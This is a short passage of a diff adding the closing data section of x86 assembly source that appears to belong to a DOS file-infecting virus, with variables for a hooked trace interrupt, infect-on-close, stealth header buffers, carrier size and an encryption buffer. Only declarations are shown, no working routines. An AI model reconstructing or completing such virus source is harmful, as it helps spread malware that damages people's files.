+OldInt1_Ofs             dw      0
+OldInt1_Seg             dw      0
+
+Flag_InfectClose        db      0
+TracerSuccess           db      0
+HookedFunction          db      0
+
+Buffer                  ExeH    < >
+ReadBuf_Length          equ     $-Ofs Buffer
+OrigHeaderBuffer        db      HeaderLength dup ('S')
+StealthBuffer           equ     ofs OrigHeaderBuffer
+
+BytesRead               dw      0
+BufferSeg               dw      0
+BufferOfs               dw      0
+PreReadPosLo            dw      0
+PreReadPosHi            dw      0
+CarrierSizeLo           dw      0
+CarrierSizeHi           dw      0
+
+End_Mark                equ     $
+Enc_Buffer              equ     $
+
+Code    ends
+        end     Sample
+
+
+
+;=======================================================================END==
